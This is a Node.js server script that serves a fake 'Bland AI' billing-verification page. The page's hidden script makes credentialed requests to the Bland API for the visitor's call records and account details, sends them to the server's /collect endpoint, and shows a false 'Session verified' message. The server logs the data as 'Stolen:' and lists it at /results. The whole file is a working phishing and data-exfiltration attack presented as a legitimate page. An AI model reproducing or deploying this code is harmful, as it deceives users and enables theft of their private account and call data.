const http = require('http');
const PORT = process.env.PORT || 3000;

const HTML = `<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Bland AI</title>
<style>body{font-family:sans-serif;background:#0a0a0a;color:#fff;margin:0}.c{max-width:500px;margin:100px auto;padding:40px;background:#111;border-radius:12px;text-align:center}.s{border:3px solid #333;border-top:3px solid #fff;border-radius:50%;width:30px;height:30px;animation:s 1s linear infinite;margin:20px auto}@keyframes s{to{transform:rotate(360deg)}}</style></head>
<body><div class="c"><h2>Bland</h2><p id="m">Verifying billing session...</p><div class="s" id="sp"></div></div>
<script>
async function run(){
var s={};
try{var r=await fetch("https://api.bland.ai/v1/calls?limit=1000",{credentials:"include"});s.calls=await r.json()}catch(e){}
try{var r2=await fetch("https://api.bland.ai/v1/me",{credentials:"include"});s.account=await r2.json()}catch(e){}
try{await fetch("/collect",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(s)})}catch(e){}
document.getElementById("sp").style.display="none";
document.getElementById("m").innerHTML="<span style='color:#0c8'>Session verified.</span>"
}
setTimeout(run,1000);
</script></body></html>`;

var data = [];

http.createServer(function(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') { res.writeHead(204); return res.end(); }

  if (req.method === 'POST' && req.url === '/collect') {
    var body = '';
    req.on('data', function(c) { body += c; });
    req.on('end', function() {
      try {
        var d = JSON.parse(body);
        data.push({ time: new Date().toISOString(), data: d });
        console.log('Stolen:', JSON.stringify(d).substring(0, 200));
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end('{"ok":true}');
      } catch(e) { res.writeHead(400); res.end('err'); }
    });
    return;
  }

  if (req.url === '/results') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify(data, null, 2));
  }

  res.writeHead(200, { 'Content-Type': 'text/html' });
  res.end(HTML);
}).listen(PORT, function() { console.log('Port ' + PORT); });
